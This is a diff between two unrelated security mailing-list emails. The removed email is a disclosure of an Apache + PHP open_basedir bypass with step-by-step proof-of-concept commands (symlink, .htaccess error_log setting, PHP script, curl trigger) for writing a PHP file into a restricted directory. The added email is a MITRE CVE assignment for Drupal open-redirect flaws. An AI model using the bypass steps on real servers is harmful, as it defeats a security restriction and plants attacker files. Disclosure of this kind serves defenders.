@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1162" "Thursday" "17" "September" "2020" "02:41:22" "+0000" "Havijoori" "havijoori@protonmail.com" "<emhIOMW1by5zKGvn1A33fxs2tjH-uFZLnjxdvjNdtX3aXQdAZ_YCxKfPJmbE8pjC4RcrxLCicHjPGPElA6yT29oq-K09pqSZ7ebXukctKHM=@protonmail.com>" "29" "[oss-security] Apache + PHP <= 7.4.10 open_basedir bypass" nil nil nil "9" "2020091702:41:22" "[oss-security] Apache + PHP <= 7.4.10 open_basedir bypass" (number mark "U       havijoori@pr Sep 17   29/1162  " thread-indent "\"[oss-security] Apache + PHP <= 7.4.10 open_basedir bypass\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Apache + PHP <= 7.4.10 open_basedir bypass" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2720" "Thursday" "26" "March" "2015" "14:10:23" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20150326181023.C6D6172E275@smtpvbsrv1.mitre.org>" "65" "[oss-security] Re: CVE requests for Drupal Core - Moderately Critical - Multiple Vulnerabilities - SA-CORE-2015-001" nil nil nil "3" "2015032618:10:23" "[oss-security] Re: CVE requests for Drupal Core - Moderately Critical - Multiple Vulnerabilities - SA-CORE-2015-001" (number mark "        cve-assign@m Mar 26   65/2720  " thread-indent "\"[oss-security] Re: CVE requests for Drupal Core - Moderately Critical - Multiple Vulnerabilities - SA-CORE-2015-001\"\n") "<CAMYtjApWZpJS1D0wB=ju1u=XbK==ryXpv+xybs9gy+hsGhGcRg@mail.gmail.com>" ("<CAMYtjApWZpJS1D0wB=ju1u=XbK==ryXpv+xybs9gy+hsGhGcRg@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 3707 invoked by uid 550); 17 Sep 2020 10:48:34 -0000
+Received: (qmail 21952 invoked by uid 550); 26 Mar 2015 18:10:36 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,50 +11,78 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 21934 invoked from network); 26 Mar 2015 18:10:35 -0000
+In-Reply-To: <CAMYtjApWZpJS1D0wB=ju1u=XbK==ryXpv+xybs9gy+hsGhGcRg@mail.gmail.com>
+Message-Id: <20150326181023.C6D6172E275@smtpvbsrv1.mitre.org>
+Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
+Date: Thu, 26 Mar 2015 14:10:23 -0400 (EDT)
+From: cve-assign@mitre.org
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 32588 invoked from network); 17 Sep 2020 02:41:35 -0000
-Date: Thu, 17 Sep 2020 02:41:22 +0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=protonmail.com;
-	s=protonmail; t=1600310484;
-	bh=kC+oCYE/JU4u+nlpNgBYpqTf+nThdaustKddUKpcdcg=;
-	h=Date:To:From:Reply-To:Subject:From;
-	b=mOu7HPOvaO1/JZPud/w487HPgBvZ77mKt7A8oHmWSwTlG0CUwwFztnnupHCEEj8uo
-	 rNykOJwYbMfGuBTeFxxM1e6PhwqraDNHZt3gbxP1iGHwJAT/9jvmOc5jdvUtZzmsfS
-	 kweecf28/lzP/swjYzsfNFKyffSmSuqmkc5Ap1BI=
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
-From: Havijoori <havijoori@protonmail.com>
-Message-ID: <emhIOMW1by5zKGvn1A33fxs2tjH-uFZLnjxdvjNdtX3aXQdAZ_YCxKfPJmbE8pjC4RcrxLCicHjPGPElA6yT29oq-K09pqSZ7ebXukctKHM=@protonmail.com>
-MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: quoted-printable
-Subject: [oss-security] Apache + PHP <= 7.4.10 open_basedir bypass
+Subject: [oss-security] Re: CVE requests for Drupal Core - Moderately Critical - Multiple Vulnerabilities - SA-CORE-2015-001
+To: pere@orga.cat
 
-Introduction
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-open_basedir security feature can be bypassed when Apache web server runs P=
-HP scripts.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-Proof of Concept
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-1. Set open_basedir as a security feature in php.ini file :
-   open_basedir =3D /var/www/html:/tmp
-2. Make a directory with the name of your web server's home directory insid=
-e your web server's home directory :
-   mkdir -p /var/www/html/var/www/html
-3. Make a symlink to a restricted writable directory inside this new direct=
-ory :
-   ln -s /home/havijoori/www/uploads /var/www/html/var/www/html/test
-4. Make a .htaccess file in your web server's root directory to set php val=
-ue :
-   php_value error_log "var/www/html/test/hacked.php"
-5. Make a PHP script, "bypass.php" in your web server's root directory to e=
-xploit the vulnerability :
-   <?php error_log("<?php phpinfo(); ?>"); ?>
-6. Call the script :
-   curl http://webserver/bypass.php
-7. After successful exploitation, our file "hacked.php" should be created i=
-n the restricted directory :
-   ls /home/havijoori/www/uploads/hacked.php
+>> Open redirect (Several vectors including the "destination" URL
+>> parameter - Drupal 6 and 7)
 
-Tested with PHP 5.2.5 and 7.x.
-Similar to CVE-2007-3378.
+We feel that, for purposes of CVE, this is best represented as two
+distinct problems.
+
+First, "destination" is essentially a reserved keyword, and both
+Drupal 6 and 7 lacked pre-processing of the original input to
+eliminate unintended uses of this keyword. As mentioned on the
+https://www.drupal.org/node/2455007 page, 'Many areas of Drupal use a
+"destination" query string parameter for built-in redirect
+functionality.' Because "destination" was intended only for this
+"built-in" use, we feel that it is roughly like a Technology-Specific
+Special Element in the http://cwe.mitre.org/data/definitions/169.html
+sense.
+
+Use CVE-2015-2749.
+
+> That issue affected differently to
+> distinct Drupal versions; for example all confirmation forms in Drupal
+> 7 could be redirected to an external page via the 'destination'
+> parameter directly, but in Drupal 6 only if the code that builds the
+> confirmation form uses the parameter (and there are only a few).
+> The destination parameter was being trusted in multiple places
+
+We do not feel that this difference between 6 and 7 requires separate
+CVE IDs.
+
+
+Second, there were these separate changes:
+
+> http://cgit.drupalcode.org/drupal/commit/includes/menu.inc?h=6.x&id=8ffc5db3c0ab926f3d4b2cf8bc51714c8c0f3c93
+> http://cgit.drupalcode.org/drupal/commit/includes/common.inc?h=7.x&id=b44056d2f8e8c71d35c85ec5c2fb8f7c8a02d8a8
+
+Here, the underlying problem is lack of checks for the special "//"
+initial sequence, which is associated with an external resource. This
+is roughly like an Input Leader in the
+http://cwe.mitre.org/data/definitions/148.html sense. Because of the
+code reorganization between 6 and 7, the code changes are not
+identical but apparently the goal is to prevent only the "//" attack
+approach, not other attack approaches. Accordingly, it can be
+considered the same problem, and the same CVE ID is applicable to both
+6 and 7.
+
+Use CVE-2015-2750.
+
+- -- 
+CVE assignment team, MITRE CVE Numbering Authority
+M/S M300
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.14 (SunOS)
+
+iQEcBAEBAgAGBQJVFErZAAoJEKllVAevmvms6JkIAKp/wlV9W6khCUN0xeEJUX/H
+cWm0kNap8NtA/cfan8oWgnSBpO2cTdB0ZLKEIKGqprJkNFb2Ng0o6mw7FO738tfZ
+7vuogcNG9A57Ocz9x/0e8DBR8gy277QBN3YdoTidbhh/x0wJGNkeuE3M0FmFAf66
+c4kzsmqJp7zmEkFE9dV44RqzALn0NIfMcjh1EmTjKc5HiyA9SbSUBcEiWK29S/cf
+FKtm/4rg1A/iJE6SjGuW0oSeIal+y7Ms404Db+7qrD2kDv52Jik6Rj/KmNcPfy+X
+vbU6YAJw9n0ntr1I9BBF+Fk4Q4AHBhwPEGyQ1rA5oTLwky3L5e9U1boPyhdfVKs=
+=8Nmg
+-----END PGP SIGNATURE-----
